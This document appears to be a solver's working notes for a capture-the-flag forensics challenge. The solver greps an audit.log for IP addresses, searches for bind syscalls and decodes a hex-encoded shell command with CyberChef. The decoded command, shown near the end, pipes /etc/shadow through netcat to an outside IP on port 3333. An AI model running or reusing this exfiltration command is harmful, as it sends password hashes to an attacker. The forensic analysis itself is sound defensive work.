IPv4 search:

infinite@conan:/mnt/c/Users/ben/Downloads/ACI CTF/I SEe You$ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" audit.log | sort | uniq
10.0.2.15
10.0.2.2
2.4.17.1


IPv6 search:

infinite@conan:/mnt/c/Users/ben/Downloads/ACI CTF/I SEe You$ grep -Eo "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))
" audit.log | sort | uniq
08:b2:eb:19:9e:e4:5c:1a
2f:b5:f3:58:68:e7:72:c3
36:75:1a:f9:03:8b:12:1c
69:29:34:e0:54:e9:cd:e7
7a:d8:bf:c1:2b:8d:21:28
7b:6a:6b:87:f7:55:4c:75
9c:ea:4c:00:a1:01:8d:57
A256:0c:9e:32:24:42:3b:8b
A256:2a:06:4b:d9:88:d1:70
A256:60:dd:06:63:7a:41:b8
A256:ac:fe:16:95:e2:b3:17
A256:d4:ce:11:ce:13:32:5a
aa:70:c7:fc:b7:89:60:3a
bb:88:3d:91:86:9a:ae:39
c0:9b:94:6e:35:89:75:9e
d4:ab:7b:9e:3a:3a:ac:85
da:a1:26:2b:85:a9:fa:eb
e1:52:ff:ce:ae:3d:8f:dc
ee:02:11:96:aa:6a:c3:d8
f3:75:41:ee:7c:75:62:d1


Checking for interesting syscalls

$ ausyscall --dump
infinite@conan:/mnt/c/Users/ben/Downloads/ACI CTF/I SEe You$ ausearch -if audit.log -sc 49
----
time->Tue Nov 19 03:30:54 2019
type=PROCTITLE msg=audit(1574163054.175:4519): proctitle=61757472616365002F62696E2F707974686F6E33007365727665722E7079
type=SOCKADDR msg=audit(1574163054.175:4519): saddr=02000050000000000000000000000000
type=SYSCALL msg=audit(1574163054.175:4519): arch=c000003e syscall=49 success=yes exit=0 a0=3 a1=7ffeac0bd9b0 a2=10 a3=2 items=0 ppid=2626 pid=2628 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="python3" exe="/usr/bin/python3.6" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)

Noticed around same time:

type=EXECVE msg=audit(1574163090.007:46336): argc=3 a0="/bin/sh" a1="-c" a2=636174202F6574632F736861646F777C6E632034342E36382E3133392E3234312033333333
type=CWD msg=audit(1574163090.007:46336):  cwd="/vagrant/website"
type=PATH msg=audit(1574163090.007:46336): item=0 name="/bin/sh" inode=100737155 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 obj=system_u:object_r:shell_exec_t:s0 objtype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
type=PATH msg=audit(1574163090.007:46336): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=6204 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 obj=system_u:object_r:ld_so_t:s0 objtype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
type=PROCTITLE msg=audit(1574163090.007:46336): proctitle=2F62696E2F707974686F6E33007365727665722E7079


CyberChef https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NjM2MTc0MjAyRjY1NzQ2MzJGNzM2ODYxNjQ2Rjc3N0M2RTYzMjAzNDM0MkUzNjM4MkUzMTMzMzkyRTMyMzQzMTIwMzMzMzMzMzM

cat /etc/shadow|nc 44.68.139.241 3333